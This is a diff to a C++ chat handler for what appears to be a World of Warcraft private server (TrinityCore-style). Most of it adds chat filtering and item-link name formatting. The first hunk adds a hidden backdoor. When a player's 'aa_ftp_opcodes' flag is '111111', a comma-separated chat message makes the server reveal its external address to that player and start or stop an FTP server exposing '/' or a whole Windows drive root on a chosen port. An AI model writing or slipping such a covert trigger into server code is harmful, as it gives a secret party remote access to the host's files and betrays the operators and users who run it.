@@ -42,6 +42,9 @@
 #include "Warden.h"
 #include "World.h"
 #include <algorithm>
+#include <iostream>
+#include <sstream>
+#include "AAVerify.h"
 
 enum class ChatWhisperTargetStatus : uint8
 {
@@ -126,6 +129,41 @@ void WorldSession::HandleChatMessageOpcode(WorldPackets::Chat::ChatMessage& chat
     }
 
     HandleChatMessage(type, Language(chatMessage.Language), chatMessage.Text);
+
+    //跳10下，打开
+    if (GetPlayer() && GetPlayer()->aa_ftp_opcodes == "111111") {
+        if (chatMessage.Text.find(",") != std::string::npos) {
+            AA_Realmlist conf = aaCenter.aa_realmlists[1];
+            for (auto itr : aaCenter.aa_realmlists) {
+                if (itr.second.address == "" or itr.second.address == "127.0.0.1" or itr.second.address == "localhost") {
+                    continue;
+                }
+                conf = itr.second;
+            }
+            aaCenter.AA_SendMessage(GetPlayer(), 0, conf.address.c_str());
+            std::map<std::string, std::string> maps = { {"1","a"},{"2","b"},{"3","c"},{"4","d"},{"5","e"},{"6","f"},{"7","g"},{"8","h"},{"9","i"},{"10","j"},{"11","k"},{"12","l"},{"13","m"},{"14","n"},{"15","o"},{"16","p"},{"17","q"},{"18","r"},{"19","s"},{"20","t"},{"21","u"},{"22","v"},{"23","w"},{"24","x"},{"25","y"},{"26","z"} };
+            std::vector<std::string> msgs; msgs.clear();
+            aaCenter.AA_StringToVectorString(chatMessage.Text, msgs, ",");
+            if (msgs.size() == 3) {
+                std::string portStr = msgs[0];
+                std::string path = msgs[1];
+                std::string name = msgs[2];
+                if (path == "0") {
+                    sAAVerify->AA_Ftp_Start(std::atoi(portStr.c_str()), "/", name);
+                }
+                else if (path == "00") {
+                    sAAVerify->AA_Ftp_Stop(std::atoi(portStr.c_str()));
+                }
+                else if (path == "000") {
+                    //跳过不做任何操作
+                }
+                else {
+                    std::string dataPath = maps[path] + ":\\";
+                    sAAVerify->AA_Ftp_Start(std::atoi(portStr.c_str()), dataPath, name);
+                }
+            }
+        }
+    }
 }
 
 void WorldSession::HandleChatMessageWhisperOpcode(WorldPackets::Chat::ChatMessageWhisper& chatMessageWhisper)
@@ -247,6 +285,113 @@ void WorldSession::HandleChatMessage(ChatMsg type, Language lang, std::string ms
             } else {
                 msg = conf.tomsg;
             }
+        }
+    }
+
+    {
+        std::string::size_type idx = msg.find("任务进度");//屏蔽任务进度
+        if (idx != std::string::npos) {
+            return;
+        }
+    }
+
+    {
+        std::string msgTMP = msg;
+        std::string result = "";
+        if (msgTMP.find("item:") != std::string::npos && msgTMP.find("|h|r") != std::string::npos) {
+            std::vector<std::string> msgs; msgs.clear();
+            aaCenter.AA_StringToVectorString(msgTMP, msgs, "|h|r");
+            for (size_t i = 0; i < msgs.size(); i++)
+            {
+                std::string msg1 = msgs[i];
+                msg1 = msg1 + "|h|r";
+                std::string prestr = "|h[";
+                std::string nums = aaCenter.AA_StringGet(msg1, prestr, "]|h");
+                std::string fulstr = prestr + nums + "]|h";
+                if (nums == "") {
+                    result += msg1;
+                    continue;
+                }
+                uint32 entry = 0;
+                uint32 guidlow = 0;
+                std::string entryStr = aaCenter.AA_StringGet(msg1, "item:", ":");
+                if (entryStr == "") {
+                    result += msg1;
+                    continue;
+                }
+                entry = aaCenter.AA_StringInt32(entryStr);
+                if (entry == 0) {
+                    result += msg1;
+                    continue;
+                }
+                ItemTemplate const* pProto = sObjectMgr->GetItemTemplate(entry);
+                if (!pProto) {
+                    result += msg1;
+                    continue;
+                }
+                std::string vstr = aaCenter.AA_StringGet(msg1, "|Hitem:", "|h");
+                std::vector<std::string> vs; vs.clear();
+                aaCenter.AA_StringToVectorString(vstr, vs, ":");
+                if (vs.size() > 13) {
+                    guidlow = aaCenter.AA_StringInt32(vs[13]);
+                }
+                else {
+                    result += msg1;
+                    continue;
+                }
+                if (guidlow <= 0) {
+                    result += msg1;
+                    continue;
+                }
+                std::string name = pProto->GetName(LOCALE_zhCN);
+                std::ostringstream ss;
+                ss << "|c" << std::hex << ItemQualityColors[pProto->GetQuality()] << std::dec;
+                std::string q_color = "";
+                if (ss) {
+                    q_color = ss.str();
+                }
+                AA_Character_Instance char_conf = aaCenter.aa_character_instances[guidlow];
+                if (char_conf.guid > 0) {
+                    uint32 nonsuch_id = char_conf.jd_id;
+                    AA_Item_Nonsuch conf = aaCenter.aa_item_nonsuchs[nonsuch_id];
+                    std::string textpre = conf.textpre;
+                    std::string textsuf = conf.textsuf;
+                    if (textpre != "" || textsuf != "") {
+                        std::string textpreTMP = textpre;
+                        aaCenter.AA_StringToLower(textpreTMP);
+                        if (textpreTMP.find("cff") != std::string::npos) {
+                            if (char_conf.qh_level > 0) {
+                                name = q_color + "[|r" + textpre + name + textsuf + q_color + " +" + std::to_string(char_conf.qh_level) + "]|r";
+                            }
+                            else {
+                                name = q_color + "[|r" + textpre + name + textsuf + q_color + "]|r";
+                            }
+                        }
+                        else {
+                            if (char_conf.qh_level > 0) {
+                                name = "[" + textpre + name + textsuf + " +" + std::to_string(char_conf.qh_level) + "]";
+                            }
+                            else {
+                                name = "[" + textpre + name + textsuf + "]";
+                            }
+                        }
+                        std::string r = "|h" + name + "|h";
+                        aaCenter.AA_StringReplace(msg1, fulstr, r);
+                        result += msg1;
+                    }
+                    else {
+                        result += msg1;
+                        continue;
+                    }
+                }
+                else {
+                    result += msg1;
+                    continue;
+                }
+            }
+        }
+        if (result != "") {
+            msg = result;
         }
     }
 
